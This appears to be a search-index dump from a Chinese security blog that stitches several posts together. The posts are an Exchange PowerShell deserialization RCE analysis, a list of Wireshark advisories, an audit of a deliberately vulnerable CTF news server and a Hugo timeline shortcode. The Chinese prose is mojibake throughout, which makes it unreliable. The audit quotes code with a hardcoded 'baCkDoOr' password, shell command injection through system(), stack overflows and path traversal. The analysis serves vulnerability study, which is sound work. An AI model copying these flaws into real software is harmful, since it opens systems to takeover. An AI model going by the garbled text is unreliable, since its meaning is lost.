ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollectionä»£ç å¦‚ä¸‹ï¼Œå…¶ä¼šå°†å¯¹è±¡çš„adaptedMemberså±æ€§æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œè€Œåœ¨å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶å·²ç»å°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åŠ å…¥åˆ°adaptedMemberså±æ€§ä¸­ã€‚æ‰€ä»¥è¿”å›çš„åˆ—è¡¨å†…ä¹Ÿä¼šåŒ…å«è¯¥å¯¹è±¡ã€‚\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } è¿”å›åˆ°GetPSStandardMemberå‡½æ•°ä¸­ï¼ŒExchangeä¼šåŒ¹é…æ„é€ å‡½æ•°è¿”å›çš„å¯¹è±¡çš„memberNameå±æ€§ï¼Œè¯¥å±æ€§æ¥æºäºGetTargetTypeForDeserializationè°ƒç”¨æ—¶ä¼ é€’çš„ç¡¬ç¼–ç TargetTypeForDeserializationï¼Œå³å°†ä»è¯¥å¯¹è±¡ä¸­æ£€ç´¢åä¸ºTargetTypeForDeserializationçš„å€¼ï¼Œå‰é¢æåˆ°è¿‡åˆ—è¡¨å†…å·²æœ‰è¯¥åå­—çš„å¯¹è±¡ï¼Œæ‰€ä»¥å°†åŒ¹é…åˆ°XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œå¹¶è¿”å›ç»™ä¸Šå±‚å‡½æ•°ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒGetTargetTypeForDeserializationè¿”å›äº†XamlReaderç±»å‹ã€‚\nè¿›å…¥åˆ°ConvertToå‡½æ•°å†…ï¼ŒvalueToConvertä¸ºä¸Šå±‚å‡½æ•°ReadOneObjectå‡½æ•°ä¼ å…¥çš„objå¯¹è±¡ï¼Œå…¶å†…åŒ…å«äº†xamlååºåˆ—åŒ–çš„å‘½ä»¤æ‰§è¡Œå­—ç¬¦ä¸²ã€‚\nè¿›å…¥åˆ°LanguagePrimitives.FigureConversionåœ¨#3527å¤„æ–­ç‚¹ï¼Œæ­¤æ—¶fromTypeä¸ºStringï¼ŒtoTypeä¸ºXamlReader\nè¿›å…¥FigureParseConversionå†…ï¼Œå°†ä¼šé€šè¿‡åå°„è·å–åˆ°XamlReaderçš„Parseæ–¹æ³•ã€‚\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parseæ–¹æ³•å°†ä¼šç”±LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCultureæ–¹æ³•è°ƒç”¨ã€‚ä¹‹åå°±æ˜¯æ™®é€šçš„ååºåˆ—åŒ–è¿‡ç¨‹äº†ã€‚\nå°ç»“ è¿™ä¸ªæ¼æ´åˆ©ç”¨é“¾æ ¸å¿ƒæ˜¯å¦‚ä½•ç»•è¿‡Exchangeé»‘åå•ç±»å¹¶ä½¿Exchangeå°†æ”»å‡»è€…æ§åˆ¶çš„æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æŒ‡å®šå±é™©ç±»é€ æˆä»£ç æ‰§è¡Œã€‚\næ¼æ´åˆ©ç”¨äº†Exchangeçš„åˆæ³•åŠŸèƒ½ï¼Œå…ˆæ„é€ äº†åä¸ºtargetTypeForDeserialization çš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åºåˆ—åŒ–å€¼ï¼Œåˆ©ç”¨Microsoft.Exchange.Data.SerializationTypeConverterçš„ç‰¹æ€§è¿”å›äº†XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œè€ŒåReadPropertieså°†å…¶åŠ å…¥åˆ°adaptedMemberå†…ã€‚åœ¨å¤–å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œæ„é€ çš„PSMembersåŒ…å«äº†åä¸ºtargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼ŒExchangeä¼šåœ¨PSMembersåˆ—è¡¨å†…åŒ¹é…targetTypeForDeserializationé¡¹ï¼Œä»è€Œæ§åˆ¶äº†ConvertToå‡½æ•°è½¬åŒ–çš„ç›®æ ‡ç±»XamlReaderï¼ŒExchangeé€šè¿‡åå°„è·å–åˆ°äº†XamlReaderçš„Parseæ–¹æ³•ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ååºåˆ—åŒ–æ”»å‡»è€…å¯æ§çš„åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚\nåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­éœ€è¦å°†.NET Frameworkçš„ä¼˜åŒ–å…³æ‰ä»¥ä¾¿dnSpyè°ƒè¯•\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 å…¶ä»–\nPSRPï¼šPowerShell Remote Protocol powerShellè¿œç¨‹åè®®ï¼Œæ˜¯å¾®è½¯æä¾›çš„é€šè¿‡SOAPåè®®ä¸Šæ‰§è¡ŒPowerShellä»£ç çš„åè®®\nå‚è€ƒèµ„æ–™\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5ä»£ç å®¡è®¡","tags":[],"description":"","content":"é€šè¿‡çˆ¬å–wiresharkçš„æ¼æ´å…¬å‘Šé¡µé¢ï¼Œç­›é€‰1.8.6ä¿®å¤çš„æ¼æ´å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š\n1.8.6/1.8.7ä¿®å¤çš„æ¼æ´\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Serverå®¡è®¡","tags":[],"description":"","content":"ä»£ç åœ°å€\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\nç¼–è¯‘ï¼šgcc -m32 -g -o news_server news_server.c\nç›®æ ‡ï¼šæ‰¾å‡º10ä¸ªbugå’Œæ¼æ´\nnews_serveré»˜è®¤å·¥ä½œåœ¨æ ¹ç›®å½•ï¼Œæ²¡æœ‰é€šè¿‡chdiråˆ‡æ¢å·¥ä½œç›®å½•ï¼ˆä¸çŸ¥é“ç®—ä¸ç®—bugï¼‰\nä¿®å¤ï¼š\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); åœ¨authenticateå‡½æ•°å­˜åœ¨adminåé—¨\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate ä¸­ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°å‘½ä»¤ï¼Œå‘½ä»¤æ³¨å…¥\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); æ ˆæº¢å‡ºã€ä»»æ„æ–‡ä»¶è¯»ï¼ˆç›®å½•ç©¿è¶Šï¼‰\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) æ–‡ä»¶å†™ï¼ˆç›®å½•ç©¿è¶Šï¼‰ã€æ ˆæº¢å‡º11å­—èŠ‚\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"ç»™hugo-theme-learnå¢åŠ timelineåŠŸèƒ½","tags":[],"description":"","content":"å‰è¨€ ç°åœ¨ä½¿ç”¨hugo-theme-learnä¸»é¢˜ï¼Œä½†è¿™ä¸ªä¸»é¢˜æ²¡æœ‰æä¾›æ—¶é—´çº¿åŠŸèƒ½ï¼Œä¸ºäº†ç»™é¦–é¡µå¢åŠ æ—¶é—´çº¿åŠŸèƒ½ï¼ŒèŠ±äº†ä¸¤å¤©ç ”ç©¶äº†ä¸€ä¸‹æ€ä¹ˆæ·»åŠ æ—¶é—´çº¿åŠŸèƒ½ã€‚\nä¸ºäº†æ–¹ä¾¿å¢åŠ æ—¶é—´çº¿çš„äº‹ä»¶ï¼Œé‡‡ç”¨è‡ªå®šä¹‰shortcodeçš„æ–¹å¼å¢åŠ æ—¶é—´çº¿ï¼Œä»£ç å¤§éƒ¨åˆ†å‚è€ƒå¼•ç”¨é“¾æ¥é‡Œé¢çš„ï¼Œé­”æ”¹äº†ä¸€ä¸‹ä»¥é€‚åº”è‡ªå·±çš„ä¸»é¢˜ï¼Œå¢åŠ äº†è¿‡å»å¤šå°‘å¤©çš„æ˜¾ç¤ºã€‚\nä»£ç å®ç° åœ¨layout/shortcodesæ–°å¢æ–‡ä»¶ï¼ševent.htmlå’Œtimeline.htmlï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // å¦‚æœæœˆä»½å¤§äº1åˆ™ if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; ç”±äºevent.htmlé‡Œé¢å¼•ç”¨äº†dayjsï¼Œè¿™ä¸ªjsä¸åœ¨å½“å‰ä¸»é¢˜å†…ï¼Œå¯ä»¥åœ¨config.tomlæ–°å¢custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]ï¼Œç„¶åæŠŠdayjs.min.jsæ”¾åœ¨theme\\hugo-theme-learn\\static\\jsç›®å½•å†…ï¼Œå³å¯è§£å†³å¯¼å…¥dayjsçš„é—®é¢˜ã€‚\næ­¤æ—¶å¯ä»¥åœ¨éœ€è¦æ·»åŠ æ—¶é—´çº¿çš„åœ°æ–¹ä½¿ç”¨timelineçš„shortcodeæ·»åŠ ï¼Œä»¥ä¸‹æ˜¯æˆ‘åšå®¢é¦–é¡µçš„æ—¶é—´çº¿ä»£ç ï¼š\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03è‡³09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} è¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§[å¢åŠ timelineåŠŸèƒ½](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29è‡³09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} å‘¨å†…å®¡è®¡äº†ä»£ç  {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} é™¤äº†è¿™ä¸ªè¿˜é¡ºä¾¿ç»™åšå®¢æ–°å¢äº†åŸºäºGithub 